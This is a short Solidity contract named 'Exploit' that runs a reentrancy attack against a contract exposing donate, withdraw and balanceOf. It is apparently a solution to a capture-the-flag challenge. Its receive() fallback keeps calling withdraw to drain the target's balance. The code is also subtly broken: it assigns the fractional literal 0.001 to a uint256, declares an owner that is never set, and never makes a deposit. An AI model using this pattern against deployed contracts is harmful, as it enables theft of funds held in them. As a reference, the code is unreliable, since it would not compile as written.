pragma solidity ^0.8.0;

interface IR {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
    function balanceOf(address _who) external view returns(uint balance);
}

contract Exploit {
    IR public ir;
    address public owner;
    uint256 public value = 0.001;

    constructor (address _instance) {
        ir = IR(_instance);
    }

    function withdraw() external {
        ir.withdraw(value);
    }

    receive() external payable {
        if(address(msg.sender).balance > 0){
            ir.withdraw(value);
        }
    }

}
